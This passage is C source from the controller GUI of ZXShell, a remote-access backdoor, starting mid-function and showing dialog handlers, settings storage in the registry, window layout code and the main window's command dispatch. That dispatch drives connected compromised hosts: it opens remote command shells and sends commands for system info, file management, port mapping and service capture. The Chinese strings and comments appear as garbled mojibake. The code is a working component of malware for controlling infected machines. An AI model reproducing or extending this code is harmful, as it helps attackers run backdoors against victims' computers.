				ret = ListView_SortItemsEx(hCtrl, SortListViewCompareFunc, (LPARAM)&nmh);

				ListView_SetItemState(hCtrl, -1, 0, LVIS_SELECTED);
				ListView_SortItemsEx(hCtrl, LV_FindRepeatedHost, (LPARAM)hCtrl);
				ret = GetSelectedItems(NULL);
				ListView_EnsureVisible(hCtrl, ret-1, FALSE);

			}
			break;

		case ID_HOSTOWNWINIO:
			{
				if(SendMessage(hCtrl, LVM_GETSELECTEDCOUNT, 0, 0) > 10)
				{
					if(MessageBox(hCtrl, MB_YESNO, "ȷ��", "��ѡ�е��������٣�ȷ����Ҫ����һ�������������?") != IDYES)
						break;
				}
				SOCKET Socket;
				nextHostIdx = -1;
				while(GetSelectedItems(&Socket))
				{
					_CZXServer *zxserver;

					zxserver = g_ShellList.IsSocketInList(Socket);

					if(zxserver == NULL)
						continue;

					if(zxserver->hOutPutDlg2)
					{
						BringWindowToTop(zxserver->hOutPutDlg2);
						continue;
					}

					if(!Startup_CmdIO(Socket))
					{
						break;
					}

				}
			}
			break;
		}
		break;
	}
	return CallWindowProc(OldMsgProc, hCtrl, uMsg, wParam, lParam);
}

//���ò����Ĵ��ڴ�������
int CALLBACK MainSettingsDlgProc(HWND hDlg, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	static bool bSaveSettings;
	switch(uMsg)
	{
	case WM_INITDIALOG:
		{
			char psw[128]="\0";

			SetDlgItemInt(hDlg, IDC_PORT, LisPort, FALSE);

			if(SoundNotify)
				SendDlgItemMessage(hDlg, IDC_SOUNDRADIO_YES, BM_CLICK, 0, 0);
			else
				SendDlgItemMessage(hDlg, IDC_SOUNDRADIO_NO, BM_CLICK, 0, 0);


		}
		return TRUE;
	case WM_COMMAND:
		switch(LOWORD(wParam))
		{
		case IDC_CLEARSETTINGS:
		{
			if(SHDeleteKey(HKEY_CURRENT_USER, "Software\\zxsctrlsettings") == ERROR_SUCCESS)
			{
				MessageBox(hDlg, MB_ICONINFORMATION, "���ò���", "�����.");	
			}
		}
			break;
		case IDC_CHANGEPSW:
			if(BST_CHECKED == IsDlgButtonChecked(hDlg, IDC_CHANGEPSW))
			{
				EnableWindow(GetDlgItem(hDlg, IDC_PSWEDIT1), TRUE);
				EnableWindow(GetDlgItem(hDlg, IDC_PSWEDIT2), TRUE);
			}else
			{
				EnableWindow(GetDlgItem(hDlg, IDC_PSWEDIT1), FALSE);
				EnableWindow(GetDlgItem(hDlg, IDC_PSWEDIT2), FALSE);
			}
			break;
		case IDOK:
			{
				CRC32 crc;
				int port;
				char psw1[128],psw2[128];
				port = GetDlgItemInt(hDlg, IDC_PORT, NULL, FALSE);
			
				if(BST_CHECKED == IsDlgButtonChecked(hDlg, IDC_CHANGEPSW))
				{

					GetDlgItemText(hDlg, IDC_PSWEDIT1, psw1, 127);
					GetDlgItemText(hDlg, IDC_PSWEDIT2, psw2, 127);
					if(strcmp(psw1, psw2) != 0)
					{
						MessageBox(hDlg, MB_ICONERROR, "���ò���", "���벻һ�£�����������.");
						return 0;
					}
					CMd5A Md5Pass;
					Md5Pass.MDString(psw1, PasswdMd5);
					PasswdCRC32 = crc.GetCrc32((BYTE*)PasswdMd5, strlen(PasswdMd5)+1);

				}
				//
				if(LisPort != port)
				{
					LisPort = port;
					MessageBox(hDlg, MB_ICONINFORMATION, "���ò���", "�˿������Ѹı䣬��������Ѿ�������Ҫ��������.");
				}
				if(BST_CHECKED == IsDlgButtonChecked(hDlg, IDC_SAVESETTINGS))
					bSaveSettings = true;
				else
					bSaveSettings = false;

				if(BST_CHECKED == IsDlgButtonChecked(hDlg, IDC_SOUNDRADIO_YES))
					SoundNotify = TRUE;
				else
					SoundNotify = FALSE;

				if(bSaveSettings)
				{
					port ^= 0x1985;
					WriteReg(HKEY_CURRENT_USER, "Software\\zxsctrlsettings", "LisPort", REG_DWORD, 0, port, 0);
					WriteReg(HKEY_CURRENT_USER, "Software\\zxsctrlsettings", "SoundNotify", REG_DWORD, 0, SoundNotify, 0);
					WriteReg(HKEY_CURRENT_USER, "Software\\zxsctrlsettings", "passwd", REG_SZ, (LPCTSTR)PasswdMd5, 0, 0);
				}
			}
			EndDialog(hDlg, true);
			return true;
		case IDCANCEL:
			EndDialog(hDlg, 0);
			return false;
		}
	}

	return FALSE;
}

//�����ڵ�����Сʱ�Կؼ�λ�õĵ���
BOOL CALLBACK PositionChildProc(HWND hwndChild, LPARAM lParam) 
{ 
    LPRECT rcParent; 
	POINT ptMe;
	POINT ptMap;
	RECT rcMe;
	RECT rcMap, rcup,rcdown;
    int i, idChild; 

	if(GetParent(hwndChild) != Main.hWnd)
		return TRUE;
 
	rcParent = (LPRECT) lParam; 
    // Retrieve the child-window identifier. Use it to set the 
    // position of the child window. 
 
    idChild = GetWindowLong(hwndChild, GWL_ID); 
 
    if (idChild == IDC_ONLINE) 
    {
  		GetWindowRect(GetDlgItem(Main.hWnd,SEPARATE_STATIC), &rcMap);
		ptMap.x = 0;
		ptMap.y = rcMap.top;
		ScreenToClient(Main.hWnd, &ptMap);

		MoveWindow(hwndChild, 
				   3, 
				   3, 
				   rcParent->right-85, 
				   ptMap.y-1-3,
				   TRUE); 

	}
    else if (idChild == SEPARATE_STATIC) 
    {
		GetWindowRect(hwndChild, &rcMe);
  		GetWindowRect(GetDlgItem(Main.hWnd,IDC_ONLINE), &rcMap);
		ptMe.x = rcMap.left;
		ptMe.y = rcMap.bottom;
		ScreenToClient(Main.hWnd, &ptMe);

		MoveWindow(hwndChild, 
				   ptMe.x, 
				   ptMe.y+1,
				   rcMap.right-rcMap.left, 
				   rcMe.bottom-rcMe.top,
				   TRUE); 

	}  
	else if (idChild == IDC_RESULT) 
    {
   		GetWindowRect(GetDlgItem(Main.hWnd,IDC_ONLINE), &rcup);
 		GetWindowRect(GetDlgItem(Main.hWnd,IDC_CMD), &rcdown);
		ptMap.x = rcup.left;
		ptMap.y = rcup.bottom;

		ScreenToClient(Main.hWnd, &ptMap);

		MoveWindow(hwndChild, 
				   ptMap.x, 
				   ptMap.y+1+2, 
				   rcup.right-rcup.left, 
				   rcParent->bottom-(ptMap.y+1+2)-(rcdown.bottom-rcdown.top)-3, 
				   TRUE); 
  
	}
    else if (idChild == IDC_CMD)
    {   
  		GetWindowRect(hwndChild, &rcMe);
  		GetWindowRect(GetDlgItem(Main.hWnd,IDC_RESULT), &rcMap);
		ptMe.x = rcMap.left;
		ptMe.y = rcMap.bottom;
		ScreenToClient(Main.hWnd, &ptMe);

		MoveWindow(hwndChild, 
				   ptMe.x, 
				   ptMe.y + 1, 
				   rcMap.right-rcMap.left, 
				   rcMe.bottom-rcMe.top, 
				   TRUE); 
	}else if (idChild == IDC_SEND)
    {
  		GetWindowRect(hwndChild, &rcMe);
  		GetWindowRect(GetDlgItem(Main.hWnd,IDC_CMD), &rcMap);
		ptMe.x = rcMap.right;
		ptMe.y = rcMap.top;
		ScreenToClient(Main.hWnd, &ptMe);

		MoveWindow(hwndChild, 
				   ptMe.x + 10, 
				   ptMe.y, 
				   rcMe.right-rcMe.left, 
				   rcMe.bottom-rcMe.top, 
				   TRUE); 
	}else
	{
   		GetWindowRect(hwndChild, &rcMe);
 		GetWindowRect(GetDlgItem(Main.hWnd,IDC_ONLINE), &rcMap);
		ptMe.x = rcMap.right;
		ptMe.y = rcMe.top;
		ScreenToClient(Main.hWnd, &ptMe);

		MoveWindow(hwndChild, 
				   ptMe.x + 10, 
				   ptMe.y, 
				   rcMe.right-rcMe.left, 
				   rcMe.bottom-rcMe.top, 
				   TRUE); 

	}

 	ShowWindow(hwndChild, SW_SHOW); 

    return TRUE;
}

BOOL TaskBar(int nimMode, HICON hSetIcon, LPCSTR tip, LPCSTR info)
{
	NOTIFYICONDATA	tn;

	memset(&tn, 0, sizeof(tn));
	tn.cbSize = sizeof(tn);
	tn.hWnd = Main.hWnd;
	tn.uID = ID_TASKBARICON;		// test
	tn.uFlags = NIF_MESSAGE|(hSetIcon ? NIF_ICON : 0)|(tip ? NIF_TIP : 0)|(info ? NIF_INFO : 0);
	tn.uCallbackMessage = WM_ICONNOTIFY;
	tn.dwInfoFlags=(info ? NIIF_INFO : 0);
	tn.hIcon = hSetIcon;
	if (tip)
		strcpy(tn.szTip, tip);
	if(info)
		strcpy(tn.szInfo, info);

	return	::Shell_NotifyIcon(nimMode, &tn);
}

//�������ߴ��ں��������
int CALLBACK SeparateCtrlProc(HWND hCtrl, UINT uMsg, WPARAM wParam, LPARAM lParam)
{

	NMLISTVIEW *pnmh;
	WNDPROC OldMsgProc = (WNDPROC)GetWindowLong(hCtrl, GWL_USERDATA);

	switch(uMsg)
	{
	case WM_INITDIALOG:
		return TRUE;
	case WM_SETCURSOR:
		SetCursor(hSeparateCursor);
		return TRUE;
	case WM_LBUTTONDOWN:
		{
			SetCapture(hCtrl);
		}
		return TRUE;
	case WM_LBUTTONUP:
		{
			ReleaseCapture();
		}
		return TRUE;
	case WM_MOUSEMOVE:
		{
			if(GetCapture() == hCtrl)
			{
				HWND hSep = GetDlgItem(Main.hWnd,SEPARATE_STATIC);
				RECT rcMe;
				RECT rcup;
				RECT rcdown;
				POINT ptMe;
				GetCursorPos(&ptMe);

   				GetWindowRect(hSep, &rcMe);
   				GetWindowRect(GetDlgItem(Main.hWnd,IDC_ONLINE), &rcup);
   				GetWindowRect(GetDlgItem(Main.hWnd,IDC_RESULT), &rcdown);

				ptMe.y = max(rcup.top+64, ptMe.y);
				ptMe.y = min(rcdown.bottom-64, ptMe.y);

				ScreenToClient(Main.hWnd, &ptMe);

				MoveWindow(hSep, 
						   3, 
						   ptMe.y, 
						   rcMe.right-rcMe.left, 
						   2, 
						   TRUE);

				UpdateWindow(Main.hWnd);

				SendMessage(Main.hWnd, WM_SIZE, 0, 0);
  
			}

		}
		return TRUE;

	}
	return CallWindowProc(OldMsgProc, hCtrl, uMsg, wParam, lParam);
}
//�����ڴ�������
int CALLBACK MainDlgProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	NMLISTVIEW *pnmh;

	switch(uMsg)
	{
	case WM_INITDIALOG:
		{
		//AnimateWindow(hWnd, 80, AW_BLEND);

		lParam = SetWindowLong(GetDlgItem(hWnd,IDC_ONLINE), GWL_WNDPROC, (long)OnlineListCtrlProc);
		SetWindowLong(GetDlgItem(hWnd,IDC_ONLINE), GWL_USERDATA, (long)lParam);
	
		lParam = SetWindowLong(GetDlgItem(hWnd,SEPARATE_STATIC), GWL_WNDPROC, (long)SeparateCtrlProc);
		SetWindowLong(GetDlgItem(hWnd,SEPARATE_STATIC), GWL_USERDATA, (long)lParam);

		//����Dialog�����ô������Ͻ�ͼ��
		SetClassLong(hWnd, GCL_HICON, (LONG)hMainIcon);

		sprintf(TempBuf, "ZXShell Client v%.2f", CTRLVERSION);

		SetWindowText(hWnd, TempBuf);
		return TRUE;

		}

	case WM_SIZE:
	case WM_SIZING:
	{
		RECT rcClient;
		GetClientRect(hWnd, &rcClient); 
		EnumChildWindows(hWnd, PositionChildProc, (LPARAM) &rcClient); 

	}
	break;

	case WM_ICONNOTIFY:
		switch(lParam) {

		case WM_LBUTTONDBLCLK:
			if(IsWindowVisible(hWnd))
			{
				ShowWindow(hWnd, SW_HIDE);
			}else
			{
				ShowWindow(hWnd, SW_SHOWNORMAL);
				SetForegroundWindow(hWnd);
			}
            break;
		case WM_MOUSEMOVE:
			{
				char szTip[64];
				sprintf(szTip, "��ǰ����: %d.", g_ShellList.GetCount());

				TaskBar(NIM_MODIFY, hMainIcon, szTip);
				break;
			}

		}
		break;
	case WM_TIMER:
		if(wParam == 1)
		{
			int ret;
			ret = ListView_GetSelectedCount(GetDlgItem(hWnd, IDC_ONLINE));
			if(ret)
			{
				sprintf(TempBuf, 
					"��������\r\n%9d"
					"ѡ�� %d",
					g_ShellList.GetCount(),
					ret);
			}else
			{
				sprintf(TempBuf, "��������\r\n%9d", g_ShellList.GetCount());
			}
			SetDlgItemText(hWnd, IDC_ONLINECOUNT, TempBuf);
		}
		break;

	case WM_COMMAND:
		switch(LOWORD(wParam))
		{
		//����˹��ܰ�ťstart

		case IDC_HOSTABORT:
			AbortConn();
			break;

		case IDC_HOSTINFO:
			sprintf(CmdBuf, "sysinfo");
			SendCmdLine(CmdBuf);
			break;
		case IDC_FILEMANAGER:
			SendCmdCode(FILEMANAGER);
			break;
		case IDC_TELHELP:
			SendCmdCode(TELHELP);
			break;
		case IDC_PORTMAP:
			SendCmdCode(PORTMAP);
			break;
		case IDC_GETCMD:
			sprintf(CmdBuf, "getcmd");
			SendCmdCode(GETCMD);
			break;
		case IDC_CAPSRV:
			sprintf(CmdBuf, "capsrv");
			SendCmdCode(CAPSRV);
			break;
		//end

		//case IDC_CLS:
		//	SendMessage(GetDlgItem(Main.hWnd, IDC_RESULT), WM_SETTEXT, 0, (LPARAM)"");
		//	break;
		case IDC_SEND:
			CmdBuf[0] = '\0';
			GetDlgItemText(hWnd, IDC_CMD, CmdBuf, MAXBUFSIZE);

			if(SendCmdLine(CmdBuf))
				SetDlgItemText(Main.hWnd, IDC_CMD, "");

			SetFocus(GetDlgItem(Main.hWnd, IDC_CMD));
			break;
		case IDC_START:
			if(!StartServer())
			{
				MessageBox(Main.hWnd, "����ʧ��, �����Ƕ˿ڳ�ͻ?", "����", MB_ICONERROR);
				break;

			}else
			{
				sprintf(TempBuf, "�����ڶ˿�: %d.\r\n", LisPort);
				OutPutResult(TempBuf);
			}
			SetTimer(hWnd, 1, 500, NULL);

			EnableWindow(GetDlgItem(hWnd, IDC_START), FALSE);
			EnableWindow(GetDlgItem(hWnd, IDC_STOP), TRUE);
			EnableWindow(GetDlgItem(hWnd, IDC_PAUSE), TRUE);
			break;
		case IDC_STOP:
			CloseServer();
			EnableWindow(GetDlgItem(hWnd, IDC_START), TRUE);
			EnableWindow(GetDlgItem(hWnd, IDC_STOP), FALSE);
			EnableWindow(GetDlgItem(hWnd, IDC_PAUSE), FALSE);
			KillTimer(hWnd, 1);
			SetDlgItemText(hWnd, IDC_ONLINECOUNT, "");
			break;

		case IDC_PAUSE:
			bServicePaused = !bServicePaused;

			SetDlgItemText(hWnd, IDC_PAUSE, bServicePaused?"�ָ�":"��ͣ");
			break;


		//�˵�����start

		case ID_SETTINGS:
		{
			//IDD_MAINSETTINGS
			DialogBoxParam(Main.hInst, (LPCTSTR)IDD_MAINSETTINGS, hWnd, (DLGPROC)MainSettingsDlgProc, 0);

		}
		break;

		case ID_ABOUT:
		{
			MessageBox(hWnd, MB_ICONINFORMATION, "ZXShell", 
				"My QQ: 5088090\r\n"
				"Email: LZX@QQ.COM\r\n"
				"Thanks for your using. :)"
				);
		}
		break;

		//end
		case IDC_QUIT:
			CloseServer();
			TaskBar(NIM_DELETE);
			PostQuitMessage(0);
			break;

		}
		break;

	case WM_SYSCOMMAND:
		switch(wParam)
		{
		case SC_CLOSE:
			{
				static bool firsttimeMinWin = true;
				if(firsttimeMinWin)
				{
					firsttimeMinWin = false;
					TaskBar(NIM_MODIFY, hMainIcon, NULL, "��̨����...˫��ͼ��ɻָ�����");
				}
			}
			ShowWindow(hWnd, SW_HIDE);
			break;
		
		}
		break;

	
	}

	return FALSE;
}
